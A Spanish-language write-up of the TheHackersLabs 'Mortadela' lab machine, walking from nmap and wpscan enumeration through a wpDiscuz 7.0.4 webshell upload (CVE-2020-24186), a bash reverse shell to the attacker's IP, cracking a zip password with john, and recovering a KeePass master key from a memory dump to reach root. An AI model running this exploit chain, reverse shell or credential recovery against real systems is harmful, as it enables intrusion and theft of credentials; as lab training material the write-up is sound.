
<h1 align="center"> TheHackersLabs: <a href="https://thehackerslabs.com/mortadela/">Moratedela</a></h1/>

## NetDiscover y NMAP

En este caso voy a utilizar la herramienta netdiscover para detectar la ip de la maquina
```bash
┌──(kali㉿kali)-[~]
└─$ sudo netdiscover -r 10.0.0.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                       
                                                                                                                                                                     
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                                            
 10.0.0.156      08:00:27:ee:58:5c      1      60  PCS Systemtechnik GmbH                                                                                            
```
-r : elegir el rango de de la red   
En este caso al ser una maquina virtual los primero 24 bits siempre son "08:00:27:XX:XX:XX"
Entonces ya sabemos las IPs
IP maquina victima: 10.0.0.156
IP maquina atacante(mia): 10.0.0.105
Ahora vamos a hacer un escaneo rapido para saber que puertos se encuentran abiertos
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -sS --min-rate 4000 -Pn -n 10.0.0.156
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:05 EDT
Nmap scan report for 10.0.0.156
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:EE:58:5C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.08 seconds
```
 
Una vez que sabemos que puertos tiene abierto vamos a ejecutar un escaneo mas centrado en detectar la version y ejecutar algunos scripts principales
 
 
```bash

┌──(kali㉿kali)-[~]
└─$ nmap -p22,80,3306 -sCV 10.0.0.156
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:09 EDT
Nmap scan report for 10.0.0.156
Host is up (0.00042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA)
|_  256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 34
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, SupportsLoadDataLocal, ConnectWithDatabase, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, ODBCClient, SupportsTransactions, IgnoreSigpipes, FoundRows, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, Support41Auth, InteractiveClient, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: m!XwnCA^4)noc##&3nS4
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
```
Podemos observar que el unico servicio que parece desactualizado es mysql, pero primero vamos a observar que hay el servidor apache
## Enumeracion
```bash
┌──(kali㉿kali)-[~]
└─$ whatweb 10.0.0.156
http://10.0.0.156 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[10.0.0.156], Title[Apache2 Debian Default Page: It works]                                                                                                                                                                       
```
Y lo que hay es la pagina por defecto del servidor apache2

![Imagen1](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_01dQkEql5t.png?raw=true)

Ahora vamos a fuzzear en busca de algun servicio
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.0.0.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.0.156/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 312] [--> http://10.0.0.156/wordpress/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
Vemos que nos encontramos con un wordpress, si visitamos la pagina nos encontramos con esto,

![Imagen2](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_lTDXfA7RCb.png?raw=true)
Y mas abajo nos encontramos con la primera entrada entrada del wordpress
![Imagen2](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_PEmTwHY6Xp.png?raw=true)
Al mirar a donde nos redirige parece que es otra ip, pero lo importante es donde esta ubicada la primera entrada del wordpress, mas tarde sera mas util

 
Al ser un wordpress tenemos la herramienta wpscan que sirve para enumerar y buscar vulneravilidades, primero vamos a hacer un escaneo basico
```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.0.0.156/wordpress/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.0.0.156/wordpress/ [10.0.0.156]
[+] Started: Fri Apr  5 12:45:50 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.156/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.156/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.0.0.156/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.156/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Outdated, released on 2024-01-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.0.0.156/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.0.0.156/wordpress/, Match: 'WordPress 6.4.3'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=======================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr  5 12:46:23 2024
[+] Requests Done: 164
[+] Cached Requests: 4
[+] Data Sent: 43.188 KB
[+] Data Received: 280.648 KB
[+] Memory used: 227.344 MB
[+] Elapsed time: 00:00:33
```
Ha encontrado algunas cosas interesantes pero esto no nos sirve mucho, ahora vamos a enumerar los plugins que tiene el wordpress y ver su version, para eso vamos a utilizar el parametro --plugins-detection en modo agresivo, esto buscara en la carpeta de plugins de wordpress y fuzzeara en esa carpeta en busca de un codigo de estado diferente al 404
```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.0.0.156/wordpress/ --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.0.0.156/wordpress/ [10.0.0.156]
[+] Started: Fri Apr  5 14:50:40 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.156/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.156/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.0.0.156/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.156/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Outdated, released on 2024-01-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.0.0.156/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.0.0.156/wordpress/, Match: 'WordPress 6.4.3'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:22 <================================================================================> (105035 / 105035) 100.00% Time: 00:03:22
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.0.0.156/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2024-03-21T00:55:00.000Z
 | Readme: http://10.0.0.156/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.0.0.156/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.0.0.156/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.0.0.156/wordpress/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://10.0.0.156/wordpress/wp-content/plugins/wpdiscuz/
 | Last Updated: 2024-03-27T17:26:00.000Z
 | Readme: http://10.0.0.156/wordpress/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.16
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.0.0.156/wordpress/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.0.0.156/wordpress/wp-content/plugins/wpdiscuz/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <=======================================================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```
Si analizamos los resultados podemos observar que hemos podido encontrar 2 plugins, el de "akismet" parece que no hay mucha diferencia con la version actual pero en cambio la de wpdiscuz esta bastante desactualizada
## Explotacion
 
Buscando el google por alguna vulneravilidad del plugin "wpdiscuz" con la version 7.0.4 , nos encontramos bastantes exploits

![](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_XNE4QOhqRF.png?raw=true)

En mi caso voy a utilizar este exploit https://www.exploit-db.com/exploits/49967
Nos lo descargamos
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ wget https://www.exploit-db.com/raw/49967                               
--2024-04-05 15:04:46--  https://www.exploit-db.com/raw/49967
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5719 (5.6K) [text/plain]
Saving to: ‘49967’

49967                                     100%[===================================================================================>]   5.58K  --.-KB/s    in 0s      

2024-04-05 15:04:47 (156 MB/s) - ‘49967’ saved [5719/5719]

                                                                                                                                                                      
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ ls -la
total 16
drwxr-xr-x 2 kali kali 4096 Apr  5 15:04 .
drwxr-xr-x 3 kali kali 4096 Apr  5 15:04 ..
-rw-r--r-- 1 kali kali 5719 Apr  5 15:04 49967


```
Si leemos el exploit nos muestra un ejemplo de uso:
```bash

[+] Specify an url target
[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
[+] Example help usage: exploit.py -h

```
Entonces lo adaptamos a nuestro entorno, como anteriormente mencione, ahora nos sera util en donde esta ubicada la primera entrada del wordpress ya que hay que proporcionarsela al exploit, en mi entorno quedaria asi
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ python3 49967 -u http://10.0.0.156/wordpress -p /index.php/2024/04/01/hola-mundo/
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[93974] | code:[200]
[!] Got wmuSecurity value: e5e00c22c0
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: rokganqjscduehq

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://192.168.0.108/wordpress/wp-content/uploads/2024/04/rokganqjscduehq-1712344618.1306.php&quot; 

> id

[x] Failed to execute PHP code...

```
Como se ve parece que al intentar manda algo nos da error, pero si miramos en la url que nos ha proporcionado, parece que ha subido la webshell exitosamente, ahora cambiamos la ip que nos da por la nuestra, ya que parece que es un fallo del wordpress(el error de mandar una ejecucion de comandos puede ser devido al redirect) 
 
Con curl podemos ejecutar comandos ya que se trata de una webshell (no hay que poner el \&quot; en la url)
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ curl http://10.0.0.156/wordpress/wp-content/uploads/2024/04/rokganqjscduehq-1712344618.1306.php?cmd=id
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
▒�   
```
Por lo que ya podemos gererarnos una revshell en nuestra terminal, primero ponemos una terminal en escucha
```bash
Terminal 1
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9020
listening on [any] 9020 ...

```
En la otra terminal tenermos que mandar la ejecucion de comandos para que cree una revshell, por lo que primero tenemos que crear la revshell 

Hay que urlencodearla ya que al pasarla con curl nos da muchos problemas ya que interpreta espacios y otros caracteres( la ip utilizada es la de la maquina atacante)
```bash
Terminal 2

┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ urlencode "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.105/9020 0>&1'"
%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.105%2F9020%200%3E%261%27
                                                                                                                                                                       
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ curl http://10.0.0.156/wordpress/wp-content/uploads/2024/04/rokganqjscduehq-1712344618.1306.php?cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.105%2F9020%200%3E%261%27

```
Ahora si me voy a la terminal 1 nos encontramos que hemos establecido conexion
```bash
Terminal 1
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9020
listening on [any] 9020 ...
connect to [10.0.0.105] from (UNKNOWN) [10.0.0.156] 43702
bash: cannot set terminal process group (577): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$
```
Ahora vamos a hacer el tratamiento de la TTY para que sea mas interactiva
```bash
www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ script /dev/null -c bash               
www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ ^Z
zsh: suspended  nc -lvnp 9020

┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9020
reset xterm                     
www-data@mortadela:/var/www/html/wordpress/wp-content/uploads/2024/04$ export TERM=xterm
```
## Escalada de privilegios
Ahora solo nos queda buscar como escalar privilegios, si vamos enumerando podemos observar que hay un archivo muy peculiar en /opt el cual tenemos permisos de lectura
```bash
www-data@mortadela:/$ cd /opt/
www-data@mortadela:/opt$ ls
muyconfidencial.zip
www-data@mortadela:/opt$ ls -la
total 90880
drwxr-xr-x  2 root root     4096 Apr  1 19:55 .
drwxr-xr-x 18 root root     4096 Apr  1 17:41 ..
-rw-r--r--  1 root root 93052465 Apr  1 19:51 muyconfidencial.zip

```
Por lo que si tenemos permisos de lectura podemos descargarlo, entoces creamos un servidor con python en la maquina victima

```bash
www-data@mortadela:/opt$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Ahora desde nuestro lado lo descargamos 
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ wget 10.0.0.156:8000/muyconfidencial.zip 
--2024-04-05 15:43:09--  http://10.0.0.156:8000/muyconfidencial.zip
Connecting to 10.0.0.156:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 93052465 (89M) [application/zip]
Saving to: ‘muyconfidencial.zip’

muyconfidencial.zip                       100%[====================================================================================>]  88.74M   157MB/s    in 0.6s    

2024-04-05 15:43:09 (157 MB/s) - ‘muyconfidencial.zip’ saved [93052465/93052465]
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ ls -la  
total 90880
drwxr-xr-x 2 kali kali     4096 Apr  5 15:43 .
drwxr-xr-x 3 kali kali     4096 Apr  5 15:04 ..
-rw-r--r-- 1 kali kali 93052465 Apr  1 13:51 muyconfidencial.zip

```
Si intentamos descomprimirlo nos pide una contraseña por lo que vamos intentar obternerla con john, primero hay que pasar la contraseña del zip a un hash para poder tratarlo john, para esto john tiene bastantes herramienta en este caso se llama "zip2john"

```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ unzip muyconfidencial.zip 
Archive:  muyconfidencial.zip
[muyconfidencial.zip] Database.kdbx password: 
   skipping: Database.kdbx           incorrect password
   skipping: KeePass.DMP             incorrect password

┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ zip2john muyconfidencial.zip > hash_muyconfidencial               
ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0
ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```
Una vez hecho eso podemos pasarlo por john

```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_muyconfidencial
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
 xxxxxxxx         (hash_muyconfidencial.zip/hash_muyconfidencial)     
1g 0:00:00:00 DONE (2024-04-05 15:55) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

(Tapo la contraseña para que no se sepa)
```
Una vez tenemos la contraseña podemos descomprimir el zip y vemos que hay, 2 archivos, uno es un archivo el cual sirve para gestionar contraseñas de forma segura ya que sin la contraseña maestra esta todo encriptado y el otro es el dumpeo de este archvivo
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ unzip muyconfidencial.zip
Archive:  muyconfidencial.zip
[muyconfidencial.zip] Database.kdbx password: 
 extracting: Database.kdbx           
  inflating: KeePass.DMP
```
Si vemos que hay algun dumpeo del keepass, podemos aprovecharnos de este dumpeo para sacar la contraseña
El exploit que voy a utilizar es este : https://github.com/z-jxy/keepass_dump
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ python3 keepass_dump.py -f ./KeePass.DMP 
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 1:  x
[*] 2:  x
[*] 3:  x
[*] 4:  x
[*] 5:  x
[*] 6:  x
[*] 7:  x
[*] 8:  x
[*] 9:  x
[*] 10: x
[*] 11: x
[*] 12: x
[*] 13: x
[*] Extracted: {UNKNOWN}xxxxxxxxxx
(Tapo la contraseña para que no se sepa)
```
Nos da todos los caracteres menos el primero, pero con un poco de paciencia se saca, una vez que tenemos la clave maestra podemos abrir el archivo keepass, yo utilizo keepassxc para abrilo en linux pero hay bastantes mas
```bash
┌──(kali㉿kali)-[~/CTF/TheHackersLabs]
└─$ keepassxc Database.kdbx 
```
![](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_r89O4LAAZE.png?raw=true)
Una vez dentro parece que se encuentra la contraseña de root
![](https://github.com/0x3Start/Write-up-CTFs/blob/main/TheHackersLabs/Mortadela/img/VirtualBoxVM_tWacrZ04Ai.png?raw=true)

Y efectivamente es la contraseña de root

```bash
www-data@mortadela:/opt$ su root
Password: 
root@mortadela:/opt# id
uid=0(root) gid=0(root) grupos=0(root)
root@mortadela:/opt# cat /home/mortadela/user.txt 
flag{user}
root@mortadela:/opt# cat /root/root.txt 
flag{root}

```
Y hemos podido obtener abmas flags
